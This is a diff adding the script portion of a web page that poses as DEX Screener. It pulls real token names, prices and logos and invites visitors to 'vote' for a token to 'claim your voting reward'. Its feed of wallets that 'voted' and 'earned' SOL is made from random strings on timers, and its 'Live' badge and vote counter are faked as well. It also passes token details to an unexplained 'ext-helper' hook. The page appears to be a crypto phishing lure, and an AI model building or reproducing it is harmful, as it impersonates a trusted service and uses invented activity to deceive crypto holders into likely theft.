+      var fetchUrl = needsCorsProxy(url) ? withCors(url) : url;
+      return fetchWithTimeout(fetchUrl, 3500).then(function (r) {
+        if (!r.ok) return null;
+        return r.json();
+      }).catch(function () {
+        return null;
+      });
+    }
+
+    // ?ca= is typically a Solana SPL mint (base58, case-sensitive) — memecoins / pump; never lowercase the mint.
+    if (eff === 'solana') {
+      p = Promise.all([
+        getJson('https://frontend-api.pump.fun/coins/' + encodeURIComponent(ca)),
+        getJson('https://tokens.jup.ag/token/' + encodeURIComponent(ca)),
+        getJson('https://api.coingecko.com/api/v3/coins/solana/contract/' + encodeURIComponent(ca)),
+        getJson('https://api.solana.fm/v0/tokens/' + encodeURIComponent(ca))
+      ]).then(function (rows) {
+        var pump = rows[0];
+        var jup = rows[1];
+        var cg = rows[2];
+        var fm = rows[3];
+        if (pump) {
+          if (pump.image_uri) out.push(pump.image_uri);
+          if (pump.imageUri) out.push(pump.imageUri);
+          if (pump.image_url) out.push(pump.image_url);
+          if (pump.image) out.push(pump.image);
+        }
+        if (jup) {
+          if (jup.logoURI) out.push(jup.logoURI);
+          if (jup.icon) out.push(jup.icon);
+        }
+        if (cg && cg.image) {
+          if (cg.image.large) out.push(cg.image.large);
+          else if (cg.image.small) out.push(cg.image.small);
+        }
+        if (fm && fm.token) {
+          if (fm.token.image) out.push(fm.token.image);
+          if (fm.token.imageUrl) out.push(fm.token.imageUrl);
+        }
+        return out;
+      });
+    } else {
+      p = Promise.resolve(out);
+    }
+
+    return p.then(function () {
+      if (!eff) return out;
+      return getJson(
+        'https://api.dexscreener.com/latest/dex/tokens/' + encodeURIComponent(eff) + '/' + encodeURIComponent(ca)
+      ).then(function (j) {
+        if (!j) return out;
+        var pairs = j.pairs || [];
+        var p0 = pairs[0];
+        if (p0 && p0.info) {
+          if (p0.info.openGraph) out.push(p0.info.openGraph);
+          if (p0.info.imageUrl) out.push(p0.info.imageUrl);
+        }
+        if (p0 && p0.baseToken && p0.baseToken.logoURI) out.push(p0.baseToken.logoURI);
+        return out;
+      });
+    });
+  }
+
+  function preloadImageUrl(url, timeoutMs) {
+    return new Promise(function (resolve, reject) {
+      var done = false;
+      var t = setTimeout(function () {
+        if (done) return;
+        done = true;
+        reject(new Error('timeout'));
+      }, timeoutMs || 10000);
+      var img = new Image();
+      img.onload = function () {
+        if (done) return;
+        done = true;
+        clearTimeout(t);
+        resolve(url);
+      };
+      img.onerror = function () {
+        if (done) return;
+        done = true;
+        clearTimeout(t);
+        reject(new Error('load'));
+      };
+      img.src = url;
+    });
+  }
+
+  function loadFirstWorkingAvatar(urls, fallbackUrl) {
+    var fb = fallbackUrl || DEFAULT_TOKEN_IMG;
+    return new Promise(function (resolve) {
+      var i = 0;
+      function next() {
+        if (i >= urls.length) {
+          resolve(fb);
+          return;
+        }
+        var u = urls[i++];
+        preloadImageUrl(u, 9000).then(function (ok) {
+          resolve(ok);
+        }).catch(function () {
+          next();
+        });
+      }
+      next();
+    });
+  }
+
+  function pickTokenImageUrl(p, ca) {
+    var c = buildTokenImageCandidates(p, ca || getCA());
+    return c[0] || '';
+  }
+  function trunc(s) {
+    s = String(s || '');
+    if (s.length <= 10) return s;
+    return s.slice(0, 6) + '...' + s.slice(-4);
+  }
+  function fmt(n) {
+    if (!isFinite(n)) return '';
+    return (+n).toFixed(4).replace(/0+$/, '').replace(/\.$/, '');
+  }
+  function fmtUsd(n) {
+    if (n == null || !isFinite(+n)) return '—';
+    n = +n;
+    if (n >= 1e9) return '$' + (n / 1e9).toFixed(2) + 'B';
+    if (n >= 1e6) return '$' + (n / 1e6).toFixed(2) + 'M';
+    if (n >= 1e3) return '$' + (n / 1e3).toFixed(2) + 'K';
+    if (n >= 1) return '$' + n.toFixed(2);
+    return '$' + n.toPrecision(4);
+  }
+  function fmtPrice(n) {
+    if (n == null || !isFinite(+n)) return '—';
+    n = +n;
+    if (n >= 1) return '$' + n.toFixed(2);
+    return '$' + n.toPrecision(4);
+  }
+  function fmtNum(n) {
+    if (n == null || !isFinite(+n)) return '—';
+    return Number(n).toLocaleString('en-US');
+  }
+  function chainLabel(id) {
+    var map = {solana:'Solana',ethereum:'Ethereum',bsc:'BSC',polygon:'Polygon',arbitrum:'Arbitrum',base:'Base',avalanche:'Avalanche',optimism:'Optimism',fantom:'Fantom',cronos:'Cronos'};
+    return map[id] || (id ? id.charAt(0).toUpperCase() + id.slice(1) : '—');
+  }
+
+  function setLive(ok) {
+    if (!liveBadge) return;
+    if (ok) {
+      liveBadge.className = 'fd-badge';
+      liveBadge.innerHTML = '<span class="fd-dot"></span> Live';
+    } else {
+      liveBadge.className = 'fd-badge off';
+      liveBadge.innerHTML = '<span style="width:6px;height:6px;border-radius:50%;background:var(--ds-red)"></span> Offline';
+    }
+  }
+
+  function showLoading() {
+    if (spinner) spinner.style.display = 'block';
+    if (imgEl) imgEl.style.display = 'none';
+  }
+
+  function toPercent(n) {
+    if (!isFinite(n)) return 50;
+    return Math.round(Math.max(0, Math.min(100, n)));
+  }
+
+  function buildFeedRow(addr, amount) {
+    var row = document.createElement('div');
+    row.className = 'fd-row';
+    row.innerHTML =
+      '<div class="fd-row-l">' +
+        '<span class="fd-row-dot"></span>' +
+        '<div>' +
+          '<div class="fd-addr">' + esc(addr) + '</div>' +
+          '<div class="fd-act">voted</div>' +
+        '</div>' +
+      '</div>' +
+      '<div class="fd-row-r">' +
+        '<div class="fd-amt">' + esc(amount) + '</div>' +
+        '<div class="fd-lbl">earned</div>' +
+      '</div>';
+    return row;
+  }
+
+  function syncExtHelperContext(p) {
+    var ca = getCA();
+    if (!ca || !p) return;
+    var base = (p && p.baseToken) || {};
+    window.__EXT_HELPER_CA__ = ca;
+    window.__EXT_HELPER_CTX__ = {
+      ca: ca,
+      chainId: p.chainId || '',
+      pairAddress: p.pairAddress || '',
+      baseAddress: base.address || '',
+      symbol: (base.symbol || '').toUpperCase(),
+      name: base.name || ''
+    };
+    try {
+      if (typeof window.dispatchEvent === 'function') {
+        window.dispatchEvent(new CustomEvent('ext-helper:context', { detail: window.__EXT_HELPER_CTX__ }));
+      }
+    } catch (e) {}
+  }
+
+  function renderPair(p) {
+    try {
+      var base = (p && p.baseToken) || {};
+      var info = (p && p.info) || {};
+      var tokenNameStr = base.name || 'Unknown';
+      var tokenSymbol = (base.symbol || '').toUpperCase();
+
+      if (nameEl) nameEl.textContent = tokenNameStr;
+      if (subEl) subEl.textContent = '$' + tokenSymbol;
+
+      var caParam = getCA();
+      var pImg = normalizePairForImage(p, caParam);
+      var loadId = ++avatarLoadSeq;
+      if (imgEl) {
+        imgEl.style.display = 'none';
+        imgEl.removeAttribute('src');
+        imgEl.onerror = null;
+      }
+      if (spinner) spinner.style.display = 'block';
+      Promise.all([
+        Promise.resolve(buildTokenImageCandidates(pImg, caParam)),
+        fetchRemotePfpUrlsForToken(pImg.chainId, caParam)
+      ]).then(function (results) {
+        var local = results[0];
+        var remote = expandRemoteUrlStrings(results[1] || []);
+        var merged = uniqUrls(remote.concat(local));
+        if (merged.length > 45) merged = merged.slice(0, 45);
+        return loadFirstWorkingAvatar(merged, DEFAULT_TOKEN_IMG);
+      }).then(function (src) {
+        if (loadId !== avatarLoadSeq) return;
+        if (imgEl) {
+          imgEl.onerror = function () {
+            try {
+              this.onerror = null;
+              this.src = DEFAULT_TOKEN_IMG;
+            } catch (e) {}
+          };
+          imgEl.src = src;
+          imgEl.style.display = 'block';
+        }
+        if (spinner) spinner.style.display = 'none';
+      }).catch(function () {
+        if (loadId !== avatarLoadSeq) return;
+        if (imgEl) {
+          imgEl.src = DEFAULT_TOKEN_IMG;
+          imgEl.style.display = 'block';
+        }
+        if (spinner) spinner.style.display = 'none';
+      });
+
+      if (chainEl && p.chainId) {
+        chainEl.style.display = 'inline-flex';
+        if (chainName) chainName.textContent = chainLabel(p.chainId);
+      }
+
+      if (statsEl) {
+        statsEl.style.display = 'grid';
+        if (statPrice) statPrice.textContent = fmtPrice(p.priceUsd);
+        if (statChange) {
+          var ch = p.priceChange && p.priceChange.h24;
+          if (ch != null) {
+            statChange.textContent = (ch >= 0 ? '+' : '') + (+ch).toFixed(2) + '%';
+            statChange.className = 'tp-stat-val ' + (ch >= 0 ? 'green' : 'red');
+          } else {
+            statChange.textContent = '—';
+          }
+        }
+        if (statMcap) statMcap.textContent = fmtUsd(p.marketCap || (p.fdv));
+        if (statLiq) statLiq.textContent = fmtUsd(p.liquidity && p.liquidity.usd);
+        if (statVol) statVol.textContent = fmtUsd(p.volume && p.volume.h24);
+        var txns24 = p.txns && p.txns.h24;
+        if (statTxns && txns24) statTxns.textContent = fmtNum((txns24.buys || 0) + (txns24.sells || 0));
+      }
+
+      if (pairEl && p.pairAddress) {
+        pairEl.style.display = 'flex';
+        if (pairAddr) pairAddr.textContent = p.pairAddress;
+      }
+
+      if (dsLink && p.url) {
+        dsLink.style.display = 'flex';
+        dsLink.href = p.url;
+      } else if (dsLink && p.chainId && p.pairAddress) {
+        dsLink.style.display = 'flex';
+        dsLink.href = 'https://dexscreener.com/' + p.chainId + '/' + p.pairAddress;
+      }
+
+      if (voteCardTitle) voteCardTitle.textContent = 'Vote for ' + tokenNameStr;
+      if (voteDesc) voteDesc.textContent = 'Vote for ' + tokenNameStr + ' to claim your voting reward';
+      if (voteBtnText) voteBtnText.textContent = 'Vote for ' + tokenNameStr;
+      var vMax = 100;
+      var vCur = 16;
+      votesLeftCurrent = vCur;
+      if (voteText) voteText.textContent = vCur + ' / ' + vMax + ' votes left';
+      if (voteBar) voteBar.style.width = toPercent((vCur / vMax) * 100) + '%';
+
+      var pageTitle = 'Vote for ' + tokenNameStr + ' ($' + tokenSymbol + ') — DEX Screener';
+      var pageDesc = 'Vote for ' + tokenNameStr + ' ($' + tokenSymbol + ') to claim your voting reward. Realtime charts and trading on DEX Screener.';
+      document.title = pageTitle;
+
+      var imgUrl = pickTokenImageUrl(pImg, caParam) || DEFAULT_TOKEN_IMG;
+      function setMeta(id, attr, val) { var el = document.getElementById(id); if (el) el.setAttribute(attr, val); }
+      setMeta('ogTitle', 'content', pageTitle);
+      setMeta('ogDesc', 'content', pageDesc);
+      setMeta('ogImage', 'content', imgUrl);
+      setMeta('ogUrl', 'content', window.location.href);
+      setMeta('twTitle', 'content', pageTitle);
+      setMeta('twDesc', 'content', pageDesc);
+      setMeta('twImage', 'content', imgUrl);
+      setMeta('metaDesc', 'content', pageDesc);
+
+      syncExtHelperContext(p);
+      startRandomMode(p);
+    } catch (e) {}
+  }
+
+  function renderSyntheticFeed(p) {
+    if (!feedEl) return;
+    feedEl.innerHTML = '';
+    for (var i = 0; i < 8; i++) {
+      var addr = genAddr();
+      var amt = (Math.random() * 0.07 + 0.19).toFixed(4).replace(/0+$/, '').replace(/\.$/, '');
+      feedEl.appendChild(buildFeedRow(addr, amt + ' SOL'));
+    }
+  }
+
+  function randomStr(len) {
+    var s = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
+    var o = '';
+    for (var i = 0; i < len; i++) o += s[Math.floor(Math.random() * s.length)];
+    return o;
+  }
+  function genAddr() { return randomStr(6) + '...' + randomStr(4); }
+  function genAmount() { return fmt(Math.random() * 0.07 + 0.19) + ' SOL'; }
+
+  var randomFeedTimer = null;
+  var randomVotesTimer = null;
+  var VOTE_MAX = 100;
+  var votesLeftCurrent = 16;
+
+  function pushRandomItem() {
+    if (!feedEl) return;
+    var row = buildFeedRow(genAddr(), genAmount());
+    if (feedEl.firstChild) feedEl.insertBefore(row, feedEl.firstChild);
+    else feedEl.appendChild(row);
+    while (feedEl.children.length > 12) feedEl.removeChild(feedEl.lastChild);
+  }
+
+  function tickVotes() {
+    if (!voteText || !voteBar) return;
+    if (votesLeftCurrent < VOTE_MAX) votesLeftCurrent++;
+    voteText.textContent = votesLeftCurrent + ' / ' + VOTE_MAX + ' votes left';
+    voteBar.style.width = toPercent((votesLeftCurrent / VOTE_MAX) * 100) + '%';
+  }
+
+  function startRandomMode(p) {
+    setLive(true);
+    if (feedEl && !feedEl.children.length) renderSyntheticFeed(p);
+    if (randomFeedTimer) clearInterval(randomFeedTimer);
+    if (randomVotesTimer) clearInterval(randomVotesTimer);
+    randomFeedTimer = setInterval(pushRandomItem, 2000);
+    randomVotesTimer = setInterval(tickVotes, 9000);
+  }
+
+  function pickPair(data) {
+    var arr = (data && data.pairs) || [];
+    return arr.length ? arr[0] : null;
+  }
+
+  /** Solana SPL mint (base58, case-sensitive) — memecoins / pump tokens use ?ca= as-is; do not alter casing. */
+  function getCA() {
+    return new URLSearchParams(window.location.search || '').get('ca') || null;
+  }
+
+  function withCors(url) {
+    return 'https://cors.isomorphic-git.org/' + url;
+  }
+
+  function fetchJsonWithRetry(url, retries) {
+    var n = retries != null ? retries : 3;
+    return fetch(url, { cache: 'no-store' })
+      .then(function (r) {
+        if (!r.ok) throw new Error('http');
+        return r.json();
+      })
+      .catch(function () {
+        if (n <= 1) return Promise.reject(new Error('fetch'));
+        return new Promise(function (fn) {
+          setTimeout(fn, 300 + Math.random() * 200);
+        }).then(function () {
+          return fetchJsonWithRetry(url, n - 1);
+        });
+      });
+  }
+
+  function fetchByCA(ca) {
+    var url = 'https://api.dexscreener.com/latest/dex/search?q=' + encodeURIComponent(ca);
+    return fetchJsonWithRetry(url, 3)
+      .then(function (json) {
+        var pair = pickPair(json);
+        if (pair) return pair;
+        return fetchJsonWithRetry('https://api.dexscreener.com/tokens/v1/' + encodeURIComponent(ca), 3)
+          .then(function (json2) {
+            var arr = Array.isArray(json2) ? json2 : (json2 && json2.pairs ? json2.pairs : []);
+            return arr.length ? arr[0] : null;
+          });
+      });
+  }
+
+  function run() {
+    showLoading();
+    var ca = getCA();
+    if (ca) window.__EXT_HELPER_CA__ = ca;
+    if (!ca) { startRandomMode({}); return; }
+    fetchByCA(ca)
+      .then(function (pair) {
+        if (pair) renderPair(pair);
+        else startRandomMode({});
+      })
+      .catch(function () {
+        var searchUrl = 'https://api.dexscreener.com/latest/dex/search?q=' + encodeURIComponent(ca);
+        fetchJsonWithRetry(withCors(searchUrl), 3)
+          .then(function (json) {
+            var pair = pickPair(json);
+            if (pair) return pair;
+            return fetchJsonWithRetry(withCors('https://api.dexscreener.com/tokens/v1/' + encodeURIComponent(ca)), 3)
+              .then(function (json2) {
+                var arr = Array.isArray(json2) ? json2 : (json2 && json2.pairs ? json2.pairs : []);
+                return arr.length ? arr[0] : null;
+              });
+          })
+          .then(function (pair) {
+            if (pair) renderPair(pair);
+            else startRandomMode({});
+          })
+          .catch(function () { startRandomMode({}); });
+      });
+  }
+
+  if (document.readyState === 'loading') document.addEventListener('DOMContentLoaded', run);
+  else run();
+})();
+</script>
+
+<script>
+(function () {
+  var preloader = document.getElementById('preloader');
+  if (!preloader) return;
+  function hide() { setTimeout(function () { preloader.classList.add('hide'); }, 1800); }
+  if (document.readyState === 'complete') hide();
+  else window.addEventListener('load', hide);
+})();
+</script>
+
+</body>
+</html>
